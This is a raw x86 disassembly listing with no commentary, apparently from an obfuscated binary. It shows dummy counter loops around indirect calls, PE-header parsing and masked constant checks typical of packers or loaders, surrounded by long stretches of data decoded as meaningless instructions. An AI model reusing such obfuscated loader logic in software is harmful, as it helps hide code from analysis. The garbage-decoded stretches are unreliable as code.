  4175a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175a3:	mul    BYTE PTR [edi]
  4175a5:	mov    ah,0x3d
  4175a7:	cdq    
  4175a8:	mov    ds:0xb1c30993,al
  4175ad:	out    0x29,eax
  4175af:	adc    cl,BYTE PTR [esi]
  4175b1:	jle    0x4175a3
  4175b3:	in     al,0xcd
  4175b5:	fcom   st(1)
  4175b7:	in     al,0xad
  4175b9:	enter  0xa3a7,0x3
  4175bd:	add    BYTE PTR [edx],dh
  4175bf:	ins    DWORD PTR es:[edi],dx
  4175c0:	jo     0x4175bb
  4175c2:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4175c4:	dec    ebx
  4175c5:	and    DWORD PTR [edx+ebp*2-0x7f],ebx
  4175c9:	std    
  4175ca:	jb     0x4175b6
  4175cc:	test   al,0xb3
  4175ce:	add    eax,0xfe7143a3
  4175d3:	mov    edi,0x73106de0
  4175d8:	inc    esi
  4175d9:	js     0x4175de
  4175db:	(bad)  
  4175dc:	pop    esi
  4175dd:	leave  
  4175de:	ret    0xc
  4175e1:	push   ebp
  4175e2:	mov    ebp,esp
  4175e4:	push   ecx
  4175e5:	mov    DWORD PTR ds:0x42a879,0x1f
  4175ef:	cmp    DWORD PTR ds:0x42a879,0x0
  4175f6:	je     0x41764a
  4175fc:	cmp    DWORD PTR ds:0x42a879,0x5
  417603:	jne    0x417621
  417609:	push   0x42a7b9
  41760e:	push   0x42a805
  417613:	push   DWORD PTR [ebp-0x14]
  417616:	push   0x42a952
  41761b:	call   DWORD PTR ds:0x41d10c
  417621:	cmp    DWORD PTR ds:0x42a879,0x6
  417628:	jne    0x417639
  41762e:	mov    eax,ds:0x42a879
  417633:	dec    eax
  417634:	mov    ds:0x42a879,eax
  417639:	mov    eax,ds:0x42a879
  41763e:	dec    eax
  41763f:	mov    ds:0x42a879,eax
  417644:	jmp    0x4175ef
  417649:	dec    eax
  41764a:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  417651:	and    DWORD PTR ds:0x42a80d,0x0
  41765b:	mov    eax,ds:0x42a80d
  417660:	inc    eax
  417661:	mov    ds:0x42a80d,eax
  417666:	cmp    DWORD PTR ds:0x42a80d,0x23
  41766d:	jne    0x417685
  417673:	push   0x42aaf2
  417678:	push   0x0
  41767a:	push   0x2c74
  41767f:	call   DWORD PTR ds:0x41d110
  417685:	cmp    DWORD PTR ds:0x42a80d,0x19
  41768c:	jb     0x41765b
  417692:	mov    eax,DWORD PTR [ebp+0x8]
  417695:	mov    al,BYTE PTR [eax]
  417697:	add    al,0x3b
  417699:	xor    al,0x43
  41769b:	cmp    al,0xcb
  41769d:	jne    0x417b32
  4176a3:	mov    eax,DWORD PTR [ebp+0x8]
  4176a6:	mov    ecx,DWORD PTR [ebp+0x8]
  4176a9:	jmp    0x4178d1
  4176ae:	ror    esp,cl
  4176b0:	xlat   BYTE PTR ds:[ebx]
  4176b1:	cmp    eax,0xd2d9c9d7
  4176b6:	jns    0x41767b
  4176b8:	sub    al,0x9b
  4176ba:	popf   
  4176bb:	mov    ebx,?
  4176bd:	pop    ecx
  4176be:	jg     0x4176ed
  4176c0:	jg     0x41773a
  4176c2:	add    eax,0x7e78787e
  4176c7:	std    
  4176c8:	repz jecxz 0x417688
  4176cb:	mov    dh,0x2e
  4176cd:	xor    al,0x2d
  4176cf:	jmp    0x41771c
  4176d1:	es add ah,cl
  4176d4:	pop    ecx
  4176d5:	sub    DWORD PTR [eax+0x53f67dd3],esp
  4176db:	pop    ds
  4176dc:	pop    si
  4176de:	ret    
  4176df:	data16 into 
  4176e1:	lock shr DWORD PTR [ebx],0xb5
  4176e5:	aad    0x97
  4176e7:	cmp    ecx,0x6f8787d2
  4176ed:	shl    ah,1
  4176ef:	daa    
  4176f0:	adc    BYTE PTR [eax],0xbc
  4176f3:	repz jmp 0x1307dae
  4176f9:	sbb    al,0x7c
  4176fb:	push   esi
  4176fc:	(bad)  
  4176fd:	fs or  eax,0x1a4f2e72
  417703:	ds mov edi,ecx
  417706:	cdq    
  417707:	xchg   esi,eax
  417708:	cwde   
  417709:	xchg   ebp,eax
  41770a:	and    eax,0x61a2f983
  41770f:	or     ah,BYTE PTR [ebx+0x100a5daf]
  417715:	sbb    ch,BYTE PTR [esi+0x9]
  417718:	in     al,dx
  417719:	sbb    al,0x39
  41771b:	jl     0x41771a
  41771d:	or     ah,bh
  41771f:	inc    edx
  417720:	mov    edx,0xea49e0b6
  417725:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417726:	xor    al,0x77
  417728:	not    BYTE PTR [ebx]
  41772a:	cmp    eax,0xc09b8659
  41772f:	cdq    
  417730:	and    BYTE PTR [edx+0x5c],bl
  417733:	or     dh,BYTE PTR [edx-0x6fb65d4c]
  417739:	ror    DWORD PTR [ecx-0x61],0x2d
  41773d:	mov    ds:0xd2b68613,al
  417742:	push   ecx
  417743:	and    esp,DWORD PTR [ecx-0x1f]
  417746:	jg     0x417761
  417748:	cwde   
  417749:	stc    
  41774a:	xlat   BYTE PTR ds:[ebx]
  41774b:	sbb    DWORD PTR [ecx+0x1a64daeb],esp
  417751:	add    dl,0xe5
  417754:	adc    edi,ebx
  417756:	push   edx
  417757:	lahf   
  417758:	test   eax,0x3aef6dfd
  41775d:	fwait
  41775e:	pusha  
  41775f:	pop    ds
  417760:	and    esi,eax
  417762:	mov    dl,BYTE PTR [ebx-0x390f6dbe]
  417768:	icebp  
  417769:	sbb    al,0xd7
  41776b:	pop    edi
  41776c:	ror    BYTE PTR [ebx-0x1018d05e],0xdd
  417773:	add    eax,0x725ac1b1
  417778:	add    esi,DWORD PTR [ecx]
  41777a:	int3   
  41777b:	sbb    BYTE PTR [esi+0x2f],al
  41777e:	mov    eax,0x38bd9907
  417783:	(bad)  [esi-0x7f]
  417786:	sub    ebx,DWORD PTR [edi]
  417788:	fadd   QWORD PTR [ebx-0x13]
  41778b:	xlat   BYTE PTR ds:[ebx]
  41778c:	(bad)  
  41778d:	int    0xe1
  41778f:	sti    
  417790:	adc    DWORD PTR [ebp+0x5b],edi
  417793:	je     0x417782
  417795:	inc    esp
  417796:	jge    0x4177aa
  417798:	call   0x4312017
  41779d:	adc    al,0xdc
  41779f:	push   esi
  4177a0:	ins    BYTE PTR es:[edi],dx
  4177a1:	iret   
  4177a2:	inc    ecx
  4177a3:	addr16 sub eax,0x436274a
  4177a9:	test   cl,ch
  4177ab:	aas    
  4177ac:	jmp    0x2109:0x1790731e
  4177b3:	lods   eax,DWORD PTR ds:[esi]
  4177b5:	(bad)  [ecx]
  4177b7:	loope  0x4177aa
  4177b9:	pop    esp
  4177ba:	and    al,BYTE PTR [esi+0x2a1d78b4]
  4177c0:	inc    esp
  4177c1:	ins    DWORD PTR es:[edi],dx
  4177c2:	aaa    
  4177c3:	ja     0x4177c4
  4177c5:	inc    esp
  4177c6:	sbb    eax,DWORD PTR [edx+0x5202fc91]
  4177cc:	sub    edx,ecx
  4177ce:	in     al,0x32
  4177d0:	fsub   DWORD PTR [ebx]
  4177d2:	ins    DWORD PTR es:[edi],dx
  4177d3:	push   esp
  4177d4:	cmc    
  4177d5:	sbb    eax,0x36a76f54
  4177da:	(bad)  
  4177db:	jg     0x4177c8
  4177dd:	imul   eax,edx,0xffffffb8
  4177e0:	imul   ebp,edi,0xf0a9dd58
  4177e6:	adc    eax,0x531904a2
  4177eb:	icebp  
  4177ec:	jl     0x4177eb
  4177ee:	repz mov bh,0xa4
  4177f1:	cmp    al,0x64
  4177f3:	das    
  4177f4:	xor    DWORD PTR [ecx+ebx*8-0x5f],ebp
  4177f8:	into   
  4177f9:	add    DWORD PTR ds:0xd591994a,edx
  4177ff:	mov    ds:0xff2a842a,eax
  417804:	gs jp  0x417787
  417807:	dec    edi
  417808:	fadd   DWORD PTR [ebx]
  41780b:	jno    0x417810
  41780d:	daa    
  41780e:	cmp    ch,BYTE PTR [ecx+0x7fe5ad0e]
  417814:	ret    0xaf50
  417817:	sbb    DWORD PTR [eax+0xf7addcd],0xffffffd4
  41781e:	call   0x5cf9:0xe47a694f
  417825:	into   
  417826:	mov    edx,0x6b228604
  41782b:	mov    dh,0x96
  41782d:	jl     0x4177f2
  41782f:	rcl    BYTE PTR [ebp+0x625ac10b],cl
  417835:	(bad)  
  417836:	xchg   ecx,eax
  417837:	add    esi,DWORD PTR [ebx-0x6226e7c8]
  41783d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41783e:	(bad)  
  41783f:	loop   0x4177ff
  417841:	enter  0x285e,0x73
  417845:	ret    0x52d7
  417848:	test   eax,0x3fbb06ad
  41784d:	inc    eax
  41784e:	mov    BYTE PTR [ecx+0x5d],bh
  417851:	lock repz sbb al,0x78
  417855:	test   BYTE PTR [edx],dl
  417857:	or     al,BYTE PTR [ecx]
  417859:	sbb    DWORD PTR [ebx+edi*4+0x677d9c53],0x49864edf
  417864:	nop
  417865:	or     eax,0xe8d2c2a3
  41786a:	sbb    edi,DWORD PTR [edi+0x2bf9612b]
  417870:	and    BYTE PTR [eax],ch
  417872:	mov    ebp,DWORD PTR [ebx-0xdc68536]
  417878:	jecxz  0x417846
  41787a:	rcr    BYTE PTR [edi-0x597845ee],1
  417880:	(bad)  [eax+0x27caff94]
  417886:	cmp    al,0xdf
  417888:	fstp   DWORD PTR [edi]
  41788a:	inc    ecx
  41788b:	sbb    dl,BYTE PTR [ebx]
  41788d:	aad    0xd6
  41788f:	and    DWORD PTR [ecx],ecx
  417891:	mov    WORD PTR [ebx-0x36],?
  417894:	es mov ah,0x79
  417897:	sbb    dh,BYTE PTR [ebx]
  417899:	sbb    ebx,edx
  41789b:	mov    WORD PTR [edi+0x6b083b49],?
  4178a1:	xchg   ebp,eax
  4178a2:	add    ebx,DWORD PTR [ebx]
  4178a4:	xchg   edx,eax
  4178a5:	push   ebp
  4178a6:	sbb    ecx,eax
  4178a8:	inc    esi
  4178a9:	mov    cl,0x11
  4178ab:	repnz fs xchg ebx,eax
  4178ae:	ror    bh,0x4d
  4178b1:	inc    esi
  4178b2:	add    al,0x62
  4178b4:	mov    cl,0xd2
  4178b6:	mov    al,0x4
  4178b8:	sbb    bh,BYTE PTR [eax+0x3d]
  4178bb:	outs   dx,DWORD PTR ds:[esi]
  4178bc:	jmp    0x94b27e9c
  4178c1:	test   DWORD PTR [ecx],esi
  4178c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178c4:	mov    ah,0xa6
  4178c6:	imul   ebp,DWORD PTR cs:[esi],0x47b5a46c
  4178cd:	loope  0x417851
  4178cf:	gs push edi
  4178d1:	add    ecx,DWORD PTR [eax+0x3c]
  4178d4:	jmp    0x417afc
  4178d9:	cmp    eax,0xced7cecf
  4178de:	aad    0xc5
  4178e0:	aad    0x63
  4178e2:	popa   
  4178e3:	adc    DWORD PTR [edi],edx
  4178e5:	push   esp
  4178e6:	lahf   
  4178e7:	fcmovnu st,st(0)
  4178e9:	add    al,0x33
  4178eb:	jg     0x417965
  4178ed:	add    eax,0xba78787e
  4178f2:	fstp   TBYTE PTR [edi]
  4178f4:	in     eax,0xce
  4178f6:	jo     0x4178a0
  4178f8:	inc    ebx
  4178f9:	add    eax,0x6c9b46ad
  4178fe:	adc    eax,0x1ef24cd2
  417903:	cdq    
  417904:	xlat   BYTE PTR ds:[ebx]
  417905:	popa   
  417906:	je     0x417970
  417908:	out    0xe1,al
  41790a:	lahf   
  41790b:	add    BYTE PTR [ebx-0x1583d1f9],bl
  417911:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417912:	in     eax,0xd7
  417914:	push   es
  417915:	das    
  417916:	repz add eax,edi
  417919:	adc    DWORD PTR [edx],eax
  41791b:	ins    DWORD PTR es:[edi],dx
  41791c:	jns    0x4178c0
  41791e:	add    esi,DWORD PTR [edx+edi*1+0x1dcc40b3]
  417925:	sbb    edx,DWORD PTR [esp+eax*4-0x5ff9d4ec]
  41792c:	fs enter 0x1541,0x83
  417931:	dec    ecx
  417932:	imul   esp,DWORD PTR [ecx-0x6a214f15],0xffffffd8
  417939:	sbb    bl,BYTE PTR [ecx-0x1a6353e4]
  41793f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417940:	out    0xd7,eax
  417942:	cli    
  417943:	push   esp
  417944:	jecxz  0x41791a
  417946:	mov    eax,fs:0x2816ae66
  41794c:	pop    DWORD PTR [edi-0x7816ea6]
  417952:	retf   
  417953:	fistp  WORD PTR [edi]
  417955:	push   0x55
  417957:	jae    0x417925
  417959:	mov    dl,0xf9
  41795b:	ins    DWORD PTR es:[edi],dx
  41795c:	sub    DWORD PTR [edx+esi*4-0xf],ebp
  417960:	or     eax,0xbdcaeb9f
  417965:	in     al,dx
  417966:	rol    DWORD PTR [edi],cl
  417968:	push   ecx
  417969:	add    BYTE PTR [esi+0x6c],bl
  41796c:	imul   ebx,DWORD PTR [eax-0x33],0xffffff8a
  417970:	in     al,dx
  417971:	and    al,0xdd
  417973:	mov    esp,0xfb62472f
  417978:	leave  
  417979:	or     ah,0x4e
  41797c:	xor    dh,cl
  41797e:	leave  
  41797f:	enter  0x40a2,0x9b
  417983:	jecxz  0x417980
  417985:	jge    0x4179c8
  417987:	dec    esp
  417988:	mov    al,ds:0x747d0894
  41798d:	xor    eax,0xc5779dca
  417992:	jnp    0x4179dc
  417994:	outs   dx,BYTE PTR ds:[esi]
  417995:	xchg   edx,eax
  417996:	mov    ds:0x718bb17a,eax
  41799b:	and    al,BYTE PTR [edi]
  41799d:	dec    ebx
  41799e:	add    cl,BYTE PTR [ecx+0x36532f96]
  4179a4:	sbb    DWORD PTR [ebx+0x37],esi
  4179a7:	sbb    al,0xc1
  4179a9:	mov    esp,0xcb1ddc25
  4179ae:	jnp    0x4179d1
  4179b0:	mov    ah,0x31
  4179b2:	in     al,0x65
  4179b4:	xor    BYTE PTR [edi+0x41],bl
  4179b7:	jbe    0x417966
  4179b9:	sub    eax,0x358d7307
  4179be:	shl    BYTE PTR [ebx-0x6c],0xe5
  4179c2:	inc    ebp
  4179c3:	mov    al,0x25
  4179c5:	or     eax,0xdb66dbc6
  4179ca:	loopne 0x41798a
  4179cc:	ficomp DWORD PTR [ebx+0x1cb65b78]
  4179d2:	adc    DWORD PTR [esi+0x504ece1d],ebx
  4179d8:	ret    
  4179d9:	xchg   eax,ecx
  4179db:	outs   dx,DWORD PTR ds:[esi]
  4179dc:	in     eax,0xe4
  4179de:	int3   
  4179df:	repnz icebp 
  4179e1:	fild   QWORD PTR [esi]
  4179e3:	xchg   BYTE PTR [esi],al
  4179e5:	xchg   ebp,eax
  4179e6:	mov    ebp,0xd406383
  4179eb:	(bad)  
  4179ec:	in     eax,dx
  4179ed:	shr    BYTE PTR [edi],1
  4179ef:	fmul   st,st(4)
  4179f1:	xor    BYTE PTR [ecx+0x2a6c9cbf],bl
  4179f7:	push   ebp
  4179f8:	inc    ecx
  4179f9:	das    
  4179fa:	and    bh,BYTE PTR [esi+0x1633184f]
  417a00:	int    0x7b
  417a02:	mov    DWORD PTR [ecx],ecx
  417a04:	nop
  417a05:	mov    ebx,0xc7873896
  417a0a:	stos   DWORD PTR es:[edi],eax
  417a0b:	gs mov al,0x7e
  417a0e:	xchg   DWORD PTR [ecx-0x4a],ebp
  417a11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a12:	cdq    
  417a13:	sub    al,dl
  417a15:	daa    
  417a16:	loop   0x417a1d
  417a18:	test   DWORD PTR [esi+0x4b],esi
  417a1b:	enter  0x9524,0xf7
  417a1f:	push   esp
  417a20:	scas   eax,DWORD PTR es:[edi]
  417a21:	into   
  417a22:	mov    ch,0x1f
  417a24:	aaa    
  417a25:	xor    BYTE PTR [edi+0x43],dl
  417a28:	mov    dl,0x73
  417a2a:	adc    eax,0x64016d60
  417a2f:	inc    ecx
  417a30:	mov    dh,0xa3
  417a32:	call   0x1a:0x9d3cefb9
  417a39:	mov    WORD PTR [ebx+0x24543176],ss
  417a3f:	xor    eax,0x887de9a5
  417a44:	xchg   DWORD PTR [ecx],edi
  417a46:	test   al,0x4d
  417a48:	je     0x417abe
  417a4a:	or     esp,ecx
  417a4c:	mov    ebp,0x82a1bbb0
  417a51:	lahf   
  417a52:	icebp  
  417a53:	(bad)
  417a58:	xchg   esi,eax
  417a59:	push   es
  417a5a:	jae    0x417a6a
  417a5c:	lea    esi,[esi-0xc]
  417a5f:	int3   
  417a60:	pop    es
  417a61:	punpckldq mm7,DWORD PTR [ecx]
  417a64:	in     ax,dx
  417a66:	std    
  417a67:	aaa    
  417a68:	lock int 0xc0
  417a6b:	xchg   edi,eax
  417a6c:	out    dx,al
  417a6d:	arpl   cx,sp
  417a6f:	fisttp QWORD PTR [edx-0x35cd9969]
  417a75:	add    eax,0xdbcca7bc
  417a7a:	inc    esp
  417a7b:	out    0xda,al
  417a7d:	jae    0x417ad6
  417a7f:	out    0x4a,al
  417a81:	add    eax,0x51b4d60f
  417a86:	fdivrp st(3),st
  417a88:	pop    edx
  417a89:	mov    ecx,0xfb25e358
  417a8e:	(bad)  [esi+0x8060f5a]
  417a94:	sub    al,0x8f
  417a96:	test   al,0xb1
  417a98:	dec    eax
  417a99:	mov    al,ds:0x37e626f4
  417a9e:	fdiv   QWORD PTR [edi]
  417aa0:	or     DWORD PTR [ecx-0x39aa607d],0xee034010
  417aaa:	outs   dx,DWORD PTR ds:[si]
  417aac:	cld    
  417aad:	cmp    al,0xeb
  417aaf:	mov    eax,cr7
  417ab2:	pushf  
  417ab3:	add    BYTE PTR [ebx+0x78830ff6],al
  417ab9:	sbb    BYTE PTR [ecx+ecx*1-0x4611ec4c],ah
  417ac0:	shl    DWORD PTR [eax-0x48],0xdf
  417ac4:	in     eax,dx
  417ac5:	ret    
  417ac6:	inc    ecx
  417ac7:	dec    esp
  417ac8:	pop    ebx
  417ac9:	faddp  st(6),st
  417acb:	mov    BYTE PTR [esi-0x2e9f4f0d],bh
  417ad1:	push   ebp
  417ad2:	push   eax
  417ad3:	out    0x39,al
  417ad5:	mov    ah,0xe5
  417ad7:	pushf  
  417ad8:	mov    BYTE PTR [ecx],0x8d
  417adb:	or     al,0x93
  417add:	test   DWORD PTR [ebp+0x51a11956],eax
  417ae3:	aaa    
  417ae4:	sbb    edx,DWORD PTR [eax-0x6e]
  417ae7:	add    ebp,DWORD PTR [eax+0x25410c69]
  417aed:	(bad)
  417af0:	fist   DWORD PTR [edi+edx*4-0x5c]
  417af4:	in     eax,0x34
  417af6:	je     0x417b3e
  417af8:	aam    0xd6
  417afa:	xchg   ebx,eax
  417afb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417afc:	mov    edx,0x7510850
  417b01:	mov    DWORD PTR [ebp+0x8],ecx
  417b04:	mov    eax,DWORD PTR [ebp-0x4]
  417b07:	xor    eax,edx
  417b09:	push   esi
  417b0a:	mov    esi,DWORD PTR [ebp+0x8]
  417b0d:	mov    ecx,0x327298
  417b12:	add    eax,ecx
  417b14:	cmp    DWORD PTR [esi+0x54],eax
  417b17:	pop    esi
  417b18:	je     0x417b26
  417b1e:	mov    eax,DWORD PTR [ebp+0x8]
  417b21:	jmp    0x417d67
  417b26:	mov    eax,DWORD PTR [ebp-0x4]
  417b29:	xor    eax,edx
  417b2b:	add    eax,ecx
  417b2d:	jmp    0x417d67
  417b32:	mov    eax,DWORD PTR [ebp-0x4]
  417b35:	jmp    0x417d5d
  417b3a:	cmp    eax,0xd53cc6d6
  417b3f:	int3   
  417b40:	leave  
  417b41:	fnstenv [esi-0x47]
  417b44:	or     eax,0xbaa65f6c
  417b49:	push   0x787f3111
  417b4e:	add    eax,0x5478787e
  417b53:	retf   0x79b7
  417b56:	fadd   DWORD PTR [esi-0x42]
  417b59:	push   edi
  417b5a:	mov    ebp,0x4ab95d97
  417b5f:	aas    
  417b60:	dec    ebx
  417b61:	lock sbb eax,0x32e9b7ec
  417b67:	adc    esi,DWORD PTR [edi-0x31bd5742]
  417b6d:	inc    edx
  417b6e:	jmp    0x6087:0xb30b7269
  417b75:	outs   dx,BYTE PTR ds:[esi]
  417b76:	iret   
  417b77:	mov    dl,0x1a
  417b79:	retf   
  417b7a:	(bad)  
  417b7b:	(bad)  
  417b7c:	add    DWORD PTR [edi+edi*4-0x7d],eax
  417b80:	or     BYTE PTR [ecx-0xc979d78],ah
  417b86:	sbb    esp,DWORD PTR [ecx]
  417b88:	inc    edx
  417b89:	test   eax,0xc0245f25
  417b8e:	xchg   esi,eax
  417b8f:	dec    ebp
  417b90:	jae    0x417b4e
  417b92:	aad    0xc0
  417b94:	add    al,0xc6
  417b96:	dec    ebx
  417b97:	mov    eax,esi
  417b99:	jmp    0x6059:0xcf8a9a1c
  417ba0:	adc    BYTE PTR [ebx+0x237aee2],dl
  417ba6:	dec    edx
  417ba7:	frstor [eax-0x4c]
  417baa:	leave  
  417bab:	cs call 0xfaf17097
  417bb1:	mov    ecx,ecx
  417bb3:	mov    esp,0x83612a63
  417bb8:	in     eax,dx
  417bb9:	pop    ds
  417bba:	call   0xe848319a
  417bbf:	pop    ebx
  417bc0:	lahf   
  417bc1:	adc    DWORD PTR [edx],edi
  417bc3:	lock shl ah,0x1b
  417bc7:	mov    ebx,0x3684e8c0
  417bcc:	dec    ecx
  417bcd:	ror    BYTE PTR [ecx-0x3e5fc5a2],0xe2
  417bd4:	xchg   edi,eax
  417bd5:	jp     0x417bc1
  417bd7:	fadd   QWORD PTR [ebp-0x49d71e92]
  417bdd:	int3   
  417bde:	loopne 0x417b8d
  417be0:	sub    DWORD PTR [ebp-0x73789882],0x6e
  417be7:	mov    al,ds:0xb2fbcb03
  417bec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417bed:	push   edx
  417bee:	cs jb  0x417b73
  417bf1:	or     ebp,DWORD PTR [ebx-0x60]
  417bf4:	mov    edi,0xe6cbe9ed
  417bf9:	shr    bh,1
  417bfb:	shr    ch,1
  417bfd:	xor    ch,BYTE PTR [edx]
  417bff:	xchg   BYTE PTR [ebp+edi*4+0x7764c4c0],ah
  417c06:	clc    
  417c07:	push   cs
  417c08:	jg     0x417c0b
  417c0a:	add    DWORD PTR [edi],eax
  417c0c:	and    eax,0x2ccf257f
  417c11:	js     0x417c57
  417c13:	retf   
  417c14:	add    al,0x45
  417c16:	daa    
  417c17:	jge    0x417c49
  417c19:	or     ecx,ebx
  417c1b:	adc    BYTE PTR [ebx-0x38],dh
  417c1e:	ss hlt 
  417c20:	ret    0xfca7
  417c23:	inc    esp
  417c24:	lds    ecx,FWORD PTR [eax+0x6be78636]
  417c2a:	mov    edx,cs
  417c2c:	mov    cs,eax
  417c2e:	inc    ecx
  417c2f:	in     al,dx
  417c30:	sub    BYTE PTR [eax-0x2d077adf],dl
  417c36:	mov    dh,0x2a
  417c38:	std    
  417c39:	retf   0x72e0
  417c3c:	lds    edi,FWORD PTR [ebp-0x33eda241]
  417c42:	mov    al,0x94
  417c44:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417c45:	add    BYTE PTR [esi],ah
  417c47:	sbb    esp,DWORD PTR [ebx-0x44d90215]
  417c4d:	popf   
  417c4e:	inc    ebx
  417c4f:	mov    bl,bh
  417c51:	mov    eax,0xf727de4c
  417c56:	pop    ds
  417c57:	stos   DWORD PTR es:[edi],eax
  417c58:	dec    esi
  417c59:	add    BYTE PTR [ebx+eiz*8],dh
  417c5c:	mov    ?,WORD PTR [edi]
  417c5e:	jmp    0xb7bb:0x49f66e9b
  417c65:	call   0xcdae:0xc180fdb8
  417c6c:	jne    0x417cd4
  417c6e:	add    bl,bh
  417c70:	pop    ds
  417c71:	fistp  DWORD PTR [edx-0x6f79d3c]
  417c77:	popf   
  417c78:	clc    
  417c79:	scas   al,BYTE PTR es:[edi]
  417c7a:	jns    0x417cc2
  417c7c:	fdiv   st(7),st
  417c7e:	retf   
  417c7f:	addr16 mov bh,0x92
  417c82:	mov    ds:0xf25f7b0c,eax
  417c87:	jae    0x417c76
  417c89:	or     DWORD PTR [ebp+0x28],esi
  417c8c:	ret    0xbbb3
  417c8f:	push   ss
  417c90:	repz ret 0xc6b5
  417c94:	push   ss
  417c95:	and    DWORD PTR [ebx-0x48],edi
  417c98:	add    BYTE PTR [ecx],dh
  417c9a:	enter  0xe85d,0x6b
  417c9e:	xchg   ebx,eax
  417c9f:	sti    
  417ca0:	push   0x2cf55c0c
  417ca5:	ins    DWORD PTR es:[edi],dx
  417ca6:	jecxz  0x417c5e
  417ca8:	jle    0x417d28
  417caa:	stos   BYTE PTR es:[edi],al
  417cab:	icebp  
  417cac:	stc    
  417cad:	push   edi
  417cae:	ffreep st(5)
  417cb0:	loop   0x417ca8
  417cb2:	sub    dl,BYTE PTR [edi-0x37314a4]
  417cb8:	push   0x69
  417cba:	push   ds
  417cbb:	js     0x417c3e
  417cbd:	add    ah,dh
  417cbf:	fiadd  WORD PTR ds:0x9dcc6135
  417cc5:	leave  
  417cc6:	push   edi
  417cc7:	push   esi
  417cc8:	push   eax
  417cc9:	pushf  
  417cca:	add    BYTE PTR [ebp+0x45],0x7b
  417cce:	jmp    0x417cdb
  417cd0:	xchg   ebp,eax
  417cd1:	mov    ah,0x26
  417cd3:	xchg   DWORD PTR [esi+ecx*2+0x293d6fb9],esp
  417cda:	mov    DWORD PTR [esi-0x7e370d23],edi
  417ce0:	sub    DWORD PTR [edx-0xe10cffc],edx
  417ce6:	loopne 0x417d59
  417ce8:	xor    BYTE PTR [esi+0x21],0xe
  417cec:	(bad)  
  417ced:	jg     0x417d3f
  417cef:	xor    DWORD PTR [ecx-0x77],edx
  417cf2:	aas    
  417cf3:	mov    esi,0x7368bf75
  417cf8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417cf9:	jecxz  0x417c7d
  417cfb:	adc    BYTE PTR [esi],cl
  417cfd:	push   ebp
  417cfe:	mov    ds:0xb95c93de,eax
  417d03:	pop    ebx
  417d04:	push   ebx
  417d05:	pop    esi
  417d06:	nop
  417d07:	neg    DWORD PTR [ecx]
  417d09:	aam    0xcc
  417d0b:	adc    esp,DWORD PTR [edx+0x554f264]
  417d11:	sahf   
  417d12:	fmul   DWORD PTR [eax]
  417d14:	(bad)  
  417d15:	in     al,dx
  417d16:	xor    edx,DWORD PTR [ebp+0x34849a11]
  417d1c:	jmp    0x29209652
  417d21:	fsubp  st(7),st
  417d23:	sbb    eax,0xc2b7b0c8
  417d28:	out    dx,eax
  417d29:	mov    ch,0x4e
  417d2b:	xchg   esp,eax
  417d2c:	pop    eax
  417d2d:	or     al,0xf5
  417d2f:	loop   0x417d27
  417d31:	mov    ebp,0x5f918686
  417d36:	data16 jns 0x417d71
  417d39:	lds    edx,FWORD PTR [esi]
  417d3b:	pop    esi
  417d3c:	add    edx,edx
  417d3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417d3f:	call   0x472fbbef
  417d44:	sbb    esi,DWORD PTR [edi]
  417d46:	adc    edx,DWORD PTR [edx]
  417d48:	out    0x32,eax
  417d4a:	std    
  417d4b:	xchg   edi,eax
  417d4c:	push   edi
  417d4d:	inc    edi
  417d4e:	mov    cl,0x86
  417d50:	push   cs
  417d51:	js     0x417d6d
  417d53:	loope  0x417d86
  417d55:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d56:	jbe    0x417dbd
  417d58:	mov    ebx,0x9792e78a
  417d5d:	xor    eax,0x7510850
  417d62:	add    eax,0x327298
  417d67:	leave  
  417d68:	ret    0x4
  417d6b:	push   ebp
  417d6c:	mov    ebp,esp
  417d6e:	push   ecx
  417d6f:	and    DWORD PTR ds:0x42a801,0x0
  417d79:	jmp    0x417d8b
  417d7e:	mov    ecx,DWORD PTR ds:0x42a801
  417d84:	inc    ecx
  417d85:	mov    DWORD PTR ds:0x42a801,ecx
  417d8b:	cmp    DWORD PTR ds:0x42a801,0x13
  417d92:	jae    0x417dbe
  417d98:	cmp    DWORD PTR ds:0x42a801,0x16
  417d9f:	jne    0x417db3
  417da5:	push   0x42a805
  417daa:	push   DWORD PTR [ebp-0x18]
  417dad:	call   DWORD PTR ds:0x41d1f8
  417db3:	jmp    0x417d7e
  417db8:	adc    eax,DWORD PTR ds:0x42a77d
  417dbe:	mov    ecx,DWORD PTR [ebp+0x8]
  417dc1:	inc    eax
  417dc2:	mov    eax,0x7510850
  417dc7:	and    DWORD PTR ds:0x42a83d,0x42a831
  417dd1:	xor    ecx,eax
  417dd3:	or     DWORD PTR ds:0x42a835,0x42a889
  417ddd:	add    ecx,0x327298
  417de3:	mov    DWORD PTR ds:0x42a775,0xf60
  417ded:	mov    DWORD PTR [ebp+0x10],ecx
  417df0:	not    ecx
  417df2:	mov    DWORD PTR [ebp+0x8],0xf34cebc
  417df9:	mov    DWORD PTR ds:0x42a835,ebx
  417dff:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  417e06:	mov    DWORD PTR ds:0x42a80d,edi
  417e0c:	mov    ecx,0xf89c8539
  417e11:	push   esi
  417e12:	mov    DWORD PTR [ebp+0x10],0x70019fa
  417e19:	mov    esi,0x3248
  417e1e:	mov    esi,DWORD PTR [ebp-0x4]
  417e21:	cmp    ecx,esi
  417e23:	mov    DWORD PTR ds:0x42a759,0x4596
  417e2d:	je     0x4187eb
  417e33:	and    DWORD PTR ds:0x42a7f1,0x0
  417e3d:	jmp    0x417e51
  417e42:	xor    esi,esi
  417e44:	or     esi,DWORD PTR ds:0x42a7f1
  417e4a:	inc    esi
  417e4b:	mov    DWORD PTR ds:0x42a7f1,esi
  417e51:	cmp    DWORD PTR ds:0x42a7f1,0x11
  417e58:	jae    0x418196
